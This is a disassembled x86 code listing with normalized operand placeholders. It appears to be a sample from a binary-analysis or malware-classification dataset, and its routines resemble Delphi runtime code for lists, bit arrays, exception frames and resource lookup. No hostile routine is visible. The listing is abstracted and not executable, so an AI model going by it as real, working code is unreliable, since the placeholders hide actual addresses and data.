mov [ ebp - 0x4 ] eax
call sub_403b7c
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418560
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_4190bc
mov esi eax
xor edx edx
push ebp
push sub_4185ca
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_419120
retn
mov edx ebx
mov eax esi
call sub_418cf8
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403b7c
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4185dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_408180
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41861c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_40416c
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_418660
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_418d54
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_418b9c
sub_4186b8
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_418cf8
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4186f8
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_4186b8
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_41871c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_4045d8
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41bf18
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418790
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41b884
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
sub_4187a0
push ebx
call sub_4061e8
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_4061e8
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_418b9c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov ebx eax
call sub_4061e8
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov ebx eax
call sub_4061e8
mov [ eax + 0xc ] ebx
sub_4187f8
push ebx
push esi
push edi
call sub_4061e8
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_418cf8
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_418828
push ebx
push esi
call sub_4061e8
mov eax [ eax + 0x8 ]
call sub_40331c
call sub_4061e8
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_418de0
mov esi eax
call sub_4061e8
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_418be8
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_4061e8
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_40331c
sub_418884
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_41891a
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418921
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4032a8
call sub_418884
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_40326c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40437c
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_405498
call sub_4054e8
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_41871c
or bl al
sub_41892c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_4189da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4189bb
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_403264
call sub_418884
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4187a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4189c2
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4187f8
retn
call sub_418828
sub_4189f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
push 0x400
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c09c
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
xor eax eax
push ebp
push sub_418a4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41f220
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418a54
mov eax [ ebp - 0x4 ]
call sub_40331c
retn
sub_418a5c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax ebx
call sub_403264
push eax
mov eax esi
call sub_403264
pop edx
cmp edx eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
call sub_419a38
push eax
mov eax esi
call sub_419a38
pop edx
cmp edx eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_418b69
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4189f0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_418b4c
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_4189f0
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_40810c
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b53
mov eax [ ebp - 0xc ]
call sub_40331c
retn
mov al 0x1
sub_418b7c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_418b9c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418be8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418c84
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028e8
mov edx esi
mov eax ebx
call sub_418cf8
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418c4c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_418c48
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bdc8
jmp sub_403ad0
sub_418c84
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_418ccc
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405f7c
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_418c4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418cd3
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_418cf8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418c84
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_418d20
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_418eb4
retn
sub_418d54
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_418d74
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418c84
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028e8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418dec
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418c84
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_418cf8
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_418be8
xor ecx ecx
mov edx esi
mov eax ebx
call sub_418d74
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_418e44
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418c84
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418e94
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_418d54
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418be8
sub_418eb4
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418c84
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_40272c
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_418ef0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_418c84
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_418eb4
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402d00
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_418be8
dec ebp
inc edi
jne r-xdata
sub_418f64
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032ec
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_418fb8
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4036d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4190bc
xor eax eax
push ebp
push sub_41901a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_40331c
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_40330c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419021
mov eax [ ebp - 0x4 ]
call sub_419120
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_419034
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4190bc
xor eax eax
push ebp
push sub_4190b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418b9c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418d54
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4190b7
mov eax [ ebp - 0x4 ]
call sub_419120
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_418c84
sub_4190d0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4190bc
xor eax eax
push ebp
push sub_419113
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418e94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41911a
mov eax [ ebp - 0x4 ]
call sub_419120
retn
sub_41912c
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419180
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_419180
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_41915c
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026ec
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402d00
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_40270c
mov edx edi
mov eax ebp
call sub_419174
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028e8
sub_419224
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_41915c
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_419180
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_419250
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_4192c8
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax esi
call sub_41c6b8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_419308
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4193be
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b0
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_40326c
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40437c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_40326c
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be84
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4193c5
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_4193e4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_419479
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_40326c
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_40437c
mov eax ebx
mov si 0xffff
call sub_403518
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419480
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax ebx
mov si 0xffff
call sub_403518
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403518
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_404498
sub_41948b
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403558
mov eax ebx
mov si 0xffff
call sub_403518
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403518
push eax
lea eax [ ebx + 0x4 ]
call sub_405ab8
mov ecx eax
mov edx r-xdata
pop eax
call sub_4033d0
sub_4194e8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_419508
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_419528
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4033d0
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_419550
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax edi
call sub_405ab8
test ebx ebx
je r-xdata
xor eax eax
mov [ edi ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
mov si 0xffff
call sub_403518
mov esi eax
test esi esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax edi
call sub_405ab8
mov edx eax
mov eax esi
call sub_419550
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax edi
call sub_405ab8
push eax
push r-xdata
push ebx
mov eax [ ebx ]
call [ eax + 0x28 ]
jmp r-xdata
sub_4195e8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_41963d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405ab8
mov edx eax
mov eax edi
call sub_419550
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419644
lea eax [ ebp - 0x4 ]
call sub_405ab8
retn
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_41964c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_419684
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4192c8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4196b4
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4196f0
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_40326c
mov edx esp
mov eax esi
call sub_40437c
add esp 0x100
pop esi
pop ebx
retn
sub_419718
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4197ad
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_40326c
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_40437c
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_403518
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_4196d8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_409280
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4197b4
lea eax [ ebp - 0x14 ]
